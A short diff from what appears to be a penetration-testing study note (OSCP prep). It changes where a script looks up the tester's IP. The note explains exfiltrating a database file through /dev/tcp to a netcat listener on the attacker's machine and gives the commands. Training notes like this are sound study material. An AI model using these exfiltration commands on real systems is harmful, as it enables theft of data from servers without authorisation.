@@ -7,7 +7,7 @@ nc -lnvp 2222 > tickets.db
 On the box, we use cat to read the file and "write" its contents to /dev/tcp//2222 . This is not exactly a file but rather a means to instruct the kernel to create a TCP connection to the specified IP and port and then write to it. It is a neat trick one can use if wget or curl are not available on a given server to upload or exfiltrate files.
 
 ```dataviewjs
-const page = dv.page("Templater/IP");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `cat tickets.db > /dev/tcp/${KaliIP}/2222`;
 
